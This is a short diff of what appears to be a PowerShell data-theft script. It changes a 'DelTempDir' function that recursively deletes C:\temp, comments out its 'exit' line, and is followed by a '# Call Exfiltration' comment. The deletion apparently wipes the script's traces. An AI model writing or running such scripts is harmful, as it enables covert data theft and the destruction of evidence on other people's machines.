@@ -125,7 +125,7 @@ function SysInfo {
 function DelTempDir {
     cd C:\
     rmdir -R \temp
-    exit
+    #exit
 }
 
 # Call Exfiltration
